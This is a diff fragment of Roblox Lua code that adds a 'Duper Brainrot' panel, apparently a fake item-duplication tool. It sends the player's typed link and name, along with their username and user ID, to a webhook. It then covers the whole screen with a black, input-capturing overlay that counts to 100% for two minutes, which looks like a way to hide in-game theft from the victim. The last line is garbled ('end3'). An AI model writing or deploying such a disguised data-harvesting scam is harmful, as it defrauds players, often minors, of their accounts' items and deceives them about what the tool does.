+feedback.Font = Enum.Font.Gotham
+feedback.TextSize = 14
+feedback.TextColor3 = Color3.fromRGB(200,200,200)
+feedback.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Buttons inside content
+local sendBtn = Instance.new("TextButton", content)
+sendBtn.Size = UDim2.new(0,140,0,36)
+sendBtn.Position = UDim2.new(1,-150,0,156) -- relative to content
+sendBtn.Text = "Send"
+sendBtn.Font = Enum.Font.GothamBold
+sendBtn.TextSize = 16
+sendBtn.TextColor3 = Color3.fromRGB(255,255,255)
+sendBtn.BackgroundColor3 = Color3.fromRGB(30,144,255)
+Instance.new("UICorner", sendBtn).CornerRadius = UDim.new(0,8)
+local sendStroke = Instance.new("UIStroke", sendBtn)
+sendStroke.Transparency = 0.85
+
+local clearBtn = Instance.new("TextButton", content)
+clearBtn.Size = UDim2.new(0,96,0,36)
+clearBtn.Position = UDim2.new(0,0,0,156) -- left inside content
+clearBtn.Text = "Clear"
+clearBtn.Font = Enum.Font.GothamBold
+clearBtn.TextSize = 16
+clearBtn.TextColor3 = Color3.fromRGB(255,255,255)
+clearBtn.BackgroundColor3 = Color3.fromRGB(90,90,90)
+Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,8)
+local clearStroke = Instance.new("UIStroke", clearBtn)
+clearStroke.Transparency = 0.85
+
+-- Black overlay
+local overlayGui = Instance.new("ScreenGui")
+overlayGui.Name = "BrainrotOverlay"
+overlayGui.ResetOnSpawn = false
+overlayGui.Parent = playerGui
+
+local overlay = Instance.new("Frame", overlayGui)
+overlay.Size = UDim2.new(1,0,1,0)
+overlay.Position = UDim2.new(0,0,0,0)
+overlay.BackgroundColor3 = Color3.new(0,0,0)
+overlay.BorderSizePixel = 0
+overlay.ZIndex = 999
+overlay.Visible = false
+overlay.Active = true
+overlay.Selectable = true
+
+local bigPercent = Instance.new("TextLabel", overlay)
+bigPercent.Size = UDim2.new(0.5,0,0.2,0)
+bigPercent.Position = UDim2.new(0.25,0,0.4,0)
+bigPercent.BackgroundTransparency = 1
+bigPercent.Font = Enum.Font.GothamBold
+bigPercent.TextSize = 72
+bigPercent.Text = ""
+bigPercent.TextColor3 = Color3.fromRGB(255,255,255)
+bigPercent.TextScaled = true
+bigPercent.ZIndex = 1000
+
+local function runOverlay(durationSeconds)
+    overlay.Visible = true
+    local total = math.max(1,durationSeconds)
+    local steps = 100
+    local stepTime = total / steps
+    for i = 1, steps do
+        bigPercent.Text = tostring(i) .. "%"
+        wait(stepTime)
+    end
+    bigPercent.Text = "100%"
+    wait(0.6)
+    overlay.Visible = false
+end
+
+local function sendNowAndOverlay()
+    local bname = tostring(nameBox.Text or ""):gsub("^%s*(.-)%s*$","%1")
+    local blink = tostring(linkBox.Text or ""):gsub("^%s*(.-)%s*$","%1")
+    if bname == "" and blink == "" then
+        feedback.TextColor3 = Color3.fromRGB(255,160,80)
+        feedback.Text = "Enter name or link"
+        return
+    end
+    local message = string.format(
+        "**Duper Brainrot**\n• Sender: %s (ID: %d)\n• Brainrot: %s\n• Link: %s\n• Time (UTC): %s",
+        player.Name,
+        player.UserId,
+        (bname~="" and bname or "(none)"),
+        (blink~="" and blink or "(none)"),
+        os.date("!%Y-%m-%d %H:%M:%S")
+    )
+    local payload = { content = message }
+    local ok, res = pcall(function() return postToWebhook(HttpService:JSONEncode(payload)) end)
+    if ok and res then
+        feedback.TextColor3 = Color3.fromRGB(120,240,130)
+        feedback.Text = "Sent"
+    else
+        feedback.TextColor3 = Color3.fromRGB(255,90,90)
+        feedback.Text = "Send failed"
+    end
+    main.Visible = false
+    spawn(function() runOverlay(120) end)
+end
+
+sendBtn.MouseButton1Click:Connect(function() pcall(sendNowAndOverlay) end)
+clearBtn.MouseButton1Click:Connect(function() nameBox.Text="" linkBox.Text="" feedback.Text="" end3
